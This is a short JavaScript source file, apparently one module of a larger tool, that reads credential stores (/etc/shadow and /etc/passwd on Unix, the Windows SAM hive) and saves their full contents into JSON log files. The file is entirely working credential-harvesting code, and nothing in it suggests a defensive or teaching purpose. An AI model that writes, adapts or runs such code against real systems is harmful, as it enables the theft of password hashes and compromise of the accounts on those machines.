// src/modules/scrape.js
const fs = require('fs');
const os = require('os');
const path = require('path');
const logger = require('../utils/logger');

async function run(_, logDir = path.resolve(__dirname, '../logs')) {
  const files = os.platform()==='win32'
    ? ['C:\\Windows\\System32\\config\\SAM']
    : ['/etc/shadow','/etc/passwd'];

  files.forEach(f => {
    try {
      const content = fs.readFileSync(f, 'utf8');
      logger.json(`scrape_${path.basename(f)}.json`,{file:f,content});
    } catch(e) {
      logger.error(`Scrape fallito ${f}: ${e.message}`);
    }
  });
}

module.exports = { run };
